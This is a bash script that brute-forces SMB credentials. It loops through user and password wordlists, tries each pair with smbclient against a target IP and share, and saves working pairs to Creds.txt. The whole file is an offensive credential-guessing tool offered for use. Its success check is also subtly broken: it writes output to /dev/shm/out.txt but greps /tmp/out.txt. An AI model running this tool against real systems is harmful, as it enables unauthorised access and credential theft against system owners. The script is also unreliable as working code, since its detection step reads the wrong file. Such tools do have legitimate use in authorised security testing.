#!/bin/bash

# demo syntax
echo "  "
echo "Usage: smb-brute.sh <Target_IP> <Share_Name> <User_list> <Password_list>" 
echo "Example :- smb-brute.sh 10.10.1.21 IPC$ users /usr/share/wordlists/rockyou.txt"
echo "  "
echo "[*] Start Brute forcing.."

RED='\033[0;31m'
GREEN='\033[0;32m'
while read pass; do
  while IFS= read -r user; do
 
    smbclient -U $user%$pass \\\\$1\\$2 1> /dev/shm/out.txt 2> /dev/shm/err.txt
 
    if grep -q help /tmp/out.txt; then
 
        echo -e "${GREEN}[+] Valid Combination Found :- $user:$pass"
        echo "$user:$pass" >> Creds.txt
 
    else
        echo -e "${RED}[-] Invalid !!!"
    fi

  done < $3
done < $4
